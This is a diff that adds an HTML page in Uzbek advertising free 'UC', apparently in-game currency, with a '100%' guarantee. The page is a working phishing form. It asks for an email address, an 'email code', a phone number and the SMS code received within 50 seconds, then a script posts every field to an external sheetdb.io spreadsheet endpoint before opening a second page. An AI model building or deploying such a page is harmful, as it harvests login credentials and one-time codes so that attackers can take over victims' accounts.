@@ -1,0 +1,64 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="./css/main.css">
+    <title>Free Uc</title>
+</head>
+<body>
+    <form action="https://sheetdb.io/api/v1/2d4oxh1p69u8d" method="post" id="sheetdb-form"  >
+        <div class="container">
+          <h1>Tekin Uc</h1>
+          <p>Siz bu joydan tekinga uc olasiz bu 100%</p>
+          <hr>
+      
+          <label for="email"><b>Email</b></label>
+          <input type="text" placeholder="Emayilingizni Kiriting" name="data[email]" required>
+      
+          <label for="psw"><b>Email Kod</b></label>
+          <input type="password" placeholder="Email Kodingizni Kiriting" name="data[psw]" required>
+      
+          <label for="psw repeat">Telefon Raqamingiz</b></label>
+          <input type="password" placeholder="Telefon Raqamingizni Kiriting" name="data[psw repeat]" required>
+
+          <label for="psw repeat">Telefoningizga Kelgan kod 50soniya</b></label>
+          <input type="password" placeholder="Telefon Raqamizga Kelgan Kodni Kiriting" name="data[psw bepeat]" required>
+      
+          <label>
+            <input type="checkbox" checked="checked" name="remember" style="margin-bottom:15px"> Menin Unutmang
+          </label>
+      
+          <p>By creating an account you agree to our <a href="#" style="color:dodgerblue">Terms & Privacy</a>.</p>
+      
+          <div class="clearfix">
+            <button type="button" class="cancelbtn">Cancel</button>
+            <button type="submit" class="signupbtn">Sign Up</button>
+          </div>
+        </div>
+      </form>
+
+
+
+      <script>
+        var form = document.getElementById('sheetdb-form');
+    form.addEventListener("submit", e => {
+      e.preventDefault();
+      fetch(form.action, {
+          method : "POST",
+          body: new FormData(document.getElementById("sheetdb-form")),
+      }).then(
+          response => response.json()
+      ).then((html) => {
+        // you can put any JS code here
+        window.open('page2.html', '_blank');
+
+      });
+    });
+    </script>
+
+
+
+</body>
+</html>
